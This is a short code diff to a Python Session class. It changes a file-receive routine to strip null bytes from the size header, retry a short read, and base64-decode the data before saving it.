@@ -152,11 +152,15 @@ class Session():
         fileData = b""
         data = self.channel.recv(128).decode()
         print(data)
-        size = int(data)
+        size = int(data.strip('\x00'))
         #size = int(self.channel.recv(128).decode())
         self.channel.send("ok")
         fileData = self.channel.recv(size)
-        misc.save_file(fileData)
+        if len(fileData) < size:
+            fileData += self.channel.recv(size)
+        print(len(fileData))
+        file = b64.decodebytes(fileData[:size])
+        misc.save_file(file)
 
     def register_agent(self, name, password):
         print("[ ] Registering agent with server...")
